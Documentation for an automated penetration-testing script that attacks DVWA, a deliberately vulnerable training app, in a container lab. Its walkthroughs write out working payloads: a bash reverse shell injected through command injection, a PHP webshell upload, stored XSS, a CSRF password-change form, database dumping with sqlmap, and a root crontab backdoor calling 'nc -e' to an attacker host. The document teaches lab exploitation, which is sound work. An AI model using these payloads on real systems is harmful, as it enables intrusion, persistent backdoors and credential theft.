# DVWA Penetration Testing Script Documentation

## Overview

`ultimate_attack.sh` is a comprehensive automated penetration testing script designed for DVWA (Damn Vulnerable Web Application). It demonstrates 8 different attack vectors commonly found in web applications, providing hands-on experience with offensive security techniques.

## Table of Contents

- [Architecture](#architecture)
- [Prerequisites](#prerequisites)
- [Attack Phases](#attack-phases)
- [Detailed Attack Breakdown](#detailed-attack-breakdown)
- [Usage](#usage)
- [Output & Reporting](#output--reporting)
- [Safety & Legal Considerations](#safety--legal-considerations)

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                  Attack Flow Diagram                     │
├─────────────────────────────────────────────────────────┤
│                                                           │
│   Kali Container                    DVWA Container       │
│   ┌──────────────┐                 ┌──────────────┐    │
│   │              │                 │              │    │
│   │  1. Nmap     │────────────────▶│  Port 80     │    │
│   │     Scan     │                 │  (HTTP)      │    │
│   │              │                 │              │    │
│   │  2. SQLMap   │────────────────▶│  SQL Vuln    │    │
│   │     Extract  │◀────────────────│  Returns DB  │    │
│   │              │                 │              │    │
│   │  3. Hydra    │────────────────▶│  Login Form  │    │
│   │     Brute    │                 │              │    │
│   │              │                 │              │    │
│   │  4. Cmd Inj  │────────────────▶│  Exec Vuln   │    │
│   │     RCE      │◀────────────────│  Rev Shell   │    │
│   │              │                 │              │    │
│   │  5. LFI      │────────────────▶│  File Read   │    │
│   │     Config   │◀────────────────│  Config.php  │    │
│   │              │                 │              │    │
│   │  6. Upload   │────────────────▶│  Store File  │    │
│   │     Webshell │◀────────────────│  Execute     │    │
│   │              │                 │              │    │
│   │  7. XSS      │────────────────▶│  Store JS    │    │
│   │     Stored   │                 │  Exec on     │    │
│   │              │                 │  Victim Load │    │
│   │              │                 │              │    │
│   │  8. CSRF     │────────────────▶│  Change Pass │    │
│   │     PoC      │                 │  (via victim)│    │
│   │              │                 │              │    │
│   └──────────────┘                 └──────────────┘    │
│                                                           │
└─────────────────────────────────────────────────────────┘
```

---

## Prerequisites

### Required Tools (Pre-installed in Kali)

| Tool | Purpose | Installation (if needed) |
|------|---------|--------------------------|
| `nmap` | Port scanning & service detection | `apt install nmap` |
| `sqlmap` | Automated SQL injection | `apt install sqlmap` |
| `hydra` | Brute force authentication | `apt install hydra` |
| `curl` | HTTP requests & exploitation | `apt install curl` |
| `nc` (netcat) | Reverse shell listener | `apt install netcat` |

### Target Configuration

- **Target Host**: `dvwa` (container hostname)
- **Security Level**: `low` (DVWA setting)
- **Session Cookie**: Must have valid PHPSESSID

---

## Attack Phases

### Phase 1: Reconnaissance
**Goal**: Gather information about the target system

- Port scanning (1000 most common ports)
- Service version detection
- Open port enumeration

### Phase 2: Exploitation
**Goal**: Exploit identified vulnerabilities

- 8 different attack vectors executed sequentially
- Each attack builds upon information from previous ones
- Results logged in real-time

### Phase 3: Summary
**Goal**: Consolidate findings and provide actionable intelligence

- Critical findings summary
- Post-exploitation access methods
- Remediation recommendations

---

## Detailed Attack Breakdown

### Attack 2.1: SQL Injection

**Vulnerability**: Unsanitized SQL queries
**Tool**: SQLMap
**Target**: `/vulnerabilities/sqli/?id=1&Submit=Submit`

**How it works**:
```bash
# SQLMap automatically tests injection points
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=..." \
       -D dvwa -T users -C user,password --dump
```

**Result**: Extracts entire user database including password hashes

**Real-world impact**:
- Complete database compromise
- Access to all user credentials
- Potential lateral movement

---

### Attack 2.2: Brute Force Authentication

**Vulnerability**: No rate limiting on login attempts
**Tool**: Hydra
**Target**: `/login.php`

**How it works**:
```bash
# Tests extracted password against login form
hydra -l admin -p "extracted_password" dvwa \
      http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

**Result**: Validates stolen credentials work

**Real-world impact**:
- Account takeover
- Privilege escalation
- Session hijacking

---

### Attack 2.3: Command Injection

**Vulnerability**: Unsanitized shell command execution
**Tool**: cURL + Bash
**Target**: `/vulnerabilities/exec/?ip=...`

**How it works**:
```bash
# Injects bash reverse shell payload
PAYLOAD="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
curl "http://dvwa/vulnerabilities/exec/?ip=127.0.0.1;$PAYLOAD"
```

**Result**: Remote code execution with web server privileges

**Real-world impact**:
- Full server compromise
- Data exfiltration capability
- Pivot to internal network

---

### Attack 2.4: Local File Inclusion (LFI)

**Vulnerability**: Unrestricted file path traversal
**Tool**: cURL
**Target**: `/vulnerabilities/fi/?page=...`

**How it works**:
```bash
# Reads arbitrary files using path traversal
curl "http://dvwa/vulnerabilities/fi/?page=../../../../config/config.inc.php"
```

**Result**: Exposes database credentials and sensitive configuration

**Real-world impact**:
- Configuration file disclosure
- Database credential theft
- Source code exposure

---

### Attack 2.5: Unrestricted File Upload

**Vulnerability**: No file type validation
**Tool**: cURL
**Target**: `/vulnerabilities/upload/`

**How it works**:
```bash
# Uploads PHP webshell disguised as JPEG
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "uploaded=@shell.php;type=image/jpeg" \
     -F "Upload=Upload" "http://dvwa/vulnerabilities/upload/"
```

**Result**: Persistent webshell for remote command execution

**Real-world impact**:
- Backdoor access
- Persistent compromise
- File system manipulation

---

### Attack 2.6: Stored Cross-Site Scripting (XSS)

**Vulnerability**: No output encoding on user input
**Tool**: cURL
**Target**: `/vulnerabilities/xss_s/`

**How it works**:
```bash
# Injects malicious JavaScript into guestbook
XSS_PAYLOAD="<script>alert('Credentials: admin:password')</script>"
curl -X POST "http://dvwa/vulnerabilities/xss_s/" \
     -d "txtName=$XSS_PAYLOAD&mtxMessage=Hacked"
```

**Result**: JavaScript executes on every visitor's browser

**Real-world impact**:
- Session cookie theft
- Credential harvesting
- Phishing attacks
- Browser exploitation

---

### Attack 2.7: Cross-Site Request Forgery (CSRF)

**Vulnerability**: No anti-CSRF tokens
**Tool**: HTML form
**Target**: `/vulnerabilities/csrf/`

**How it works**:
```html
<!-- Malicious page auto-submits form -->
<form action="http://dvwa/vulnerabilities/csrf/" method="POST">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
  <input type="hidden" name="Change" value="Change">
</form>
<script>document.forms[0].submit()</script>
```

**Result**: Victim unknowingly changes their password

**Real-world impact**:
- Account takeover
- Unauthorized actions
- Privilege escalation

---

### Attack 2.8: Persistence Mechanism

**Vulnerability**: Command injection + privilege escalation
**Tool**: Crontab backdoor
**Target**: System crontab via command injection

**How it works**:
```bash
# Injects cron job for recurring reverse shell
echo "* * * * * root nc -e /bin/bash ATTACKER_IP 9999" >> /etc/crontab
```

**Result**: Backdoor executes every minute

**Real-world impact**:
- Persistent access even after patching
- Survivability across reboots
- Detection evasion

---

## Usage

### Basic Execution

```bash
# From within Kali container
cd /root
chmod +x ultimate_attack.sh
./ultimate_attack.sh
```

### Step-by-Step Execution

```bash
# 1. Ensure DVWA is accessible
curl -I http://dvwa

# 2. Update session cookie (if needed)
# Login to DVWA, grab PHPSESSID from browser DevTools
# Edit script line 13: COOKIE="PHPSESSID=YOUR_SESSION_ID; security=low"

# 3. Run the script
./ultimate_attack.sh

# 4. Monitor output
# Colored output shows progress in real-time
# Green ✓ = Success
# Yellow → = Info
# Red ✗ = Error

# 5. View report
cat /tmp/reports/dvwa_pentest_*.txt
```

### Advanced Usage

```bash
# Run with verbose output
bash -x ultimate_attack.sh

# Run specific phase only (manual editing required)
# Comment out unwanted phases in script

# Background execution
nohup ./ultimate_attack.sh > /tmp/attack.log 2>&1 &
```

---

## Output & Reporting

### Report Structure

```
/tmp/reports/dvwa_pentest_YYYYMMDD_HHMMSS.txt
├── Header (Timestamp, Target)
├── Phase 1: Reconnaissance
│   ├── Port scan results
│   └── Service detection
├── Phase 2: Exploitation
│   ├── Attack 2.1: SQL Injection results
│   ├── Attack 2.2: Brute force validation
│   ├── Attack 2.3: Command injection payload
│   ├── Attack 2.4: LFI exposed data
│   ├── Attack 2.5: Webshell URL
│   ├── Attack 2.6: XSS injection point
│   ├── Attack 2.7: CSRF PoC location
│   └── Attack 2.8: Backdoor details
└── Phase 3: Summary
    ├── Critical findings
    ├── Post-exploitation access
    └── Recommendations
```

### Report Example

```
=========================================================================
           DVWA PENETRATION TEST REPORT
           Generated: 2025-11-21 14:30:45
           Target: dvwa (http://dvwa)
=========================================================================

[PHASE 1] RECONNAISSANCE

→ Step 1.1: Port Scanning (Top 1000 ports)
80/tcp   open  http    Apache httpd 2.4.25
✓ Port scan completed

[PHASE 2] EXPLOITATION

→ Attack 2.1: SQL Injection (Database Extraction)
✓ SQL Injection successful
→ Extracted credentials: admin:admin_password
  Username: admin
  Password: admin_password

[PHASE 3] ATTACK SUMMARY

Critical Findings:
  1. SQL Injection: Database fully compromised
  2. Weak Authentication: Credentials extracted (admin:password)
  3. Command Injection: Remote code execution achieved
  ...
```

### Additional Artifacts

| File | Content |
|------|---------|
| `/tmp/nmap_scan.txt` | Full nmap output |
| `/tmp/shell.php` | PHP webshell source |
| `/tmp/csrf_poc_*.html` | CSRF proof-of-concept |

---

## Safety & Legal Considerations

### ⚠️ WARNING: Legal Use Only

This script is designed **EXCLUSIVELY** for:
- Authorized penetration testing
- Educational purposes in isolated lab environments
- Security research with written permission

### Illegal Uses

**NEVER** use this script against:
- Systems you don't own
- Systems without written authorization
- Production environments
- Third-party websites

**Legal consequences**:
- Criminal charges (Computer Fraud and Abuse Act)
- Civil lawsuits
- Imprisonment

### Best Practices

1. **Isolated Environment**
   - Use only in Docker containers
   - No internet connectivity
   - Separate VLAN/network

2. **Documentation**
   - Keep authorization letters
   - Document scope of testing
   - Log all activities

3. **Responsible Disclosure**
   - Report findings to vendors
   - Allow remediation time
   - Follow coordinated disclosure

4. **Data Handling**
   - Encrypt sensitive findings
   - Secure report storage
   - Proper data disposal

---

## Troubleshooting

### Common Issues

#### 1. "Connection refused" errors
```bash
# Check DVWA is running
docker ps | grep dvwa

# Check network connectivity
docker exec kali ping dvwa

# Verify security level
# Login to DVWA → http://localhost:8081
# DVWA Security → Set to "low"
```

#### 2. SQLMap takes too long
```bash
# Reduce threads
sqlmap ... --threads=5  # Instead of 10

# Use faster techniques only
sqlmap ... --technique=U  # UNION-based only
```

#### 3. Invalid session cookie
```bash
# Get new cookie:
# 1. Open Firefox in DVWA container
# 2. Login to http://localhost:8081
# 3. F12 → Storage → Cookies → Copy PHPSESSID
# 4. Update script line 13
```

#### 4. Reverse shell doesn't connect
```bash
# On attacker (Kali), start listener FIRST
nc -lvnp 4444

# Then run the command injection attack
# Check firewall rules
iptables -L
```

---

## Extending the Script

### Adding New Attacks

```bash
# Template for new attack
log_info "Attack 2.X: [Attack Name]"
log_info "Target: $URL/vulnerabilities/[vuln_name]/"

# Your attack code here
RESULT=$(your_command)

if [ -n "$RESULT" ]; then
    log_success "[Attack Name] successful"
    echo "$RESULT" | tee -a "$REPORT"
else
    log_error "[Attack Name] failed"
fi
echo "" | tee -a "$REPORT"
```

### Customizing Reports

```bash
# Add custom section
log_header "[CUSTOM] My Analysis"
echo "Custom findings here" | tee -a "$REPORT"

# Export to JSON
# Add after Phase 3:
jq -n \
  --arg target "$TARGET" \
  --arg admin_pass "$ADMIN_PASS" \
  '{target: $target, credentials: {user: "admin", pass: $admin_pass}}' \
  > "$REPORT_DIR/results.json"
```

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA Documentation](https://github.com/digininja/DVWA)
- [SQLMap Documentation](https://sqlmap.org/)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [Nmap Reference Guide](https://nmap.org/book/)

---

## License & Disclaimer

This script is provided for **educational purposes only**. The authors are not responsible for any misuse or damage caused by this script. Always obtain proper authorization before testing any system.

**Use at your own risk.**
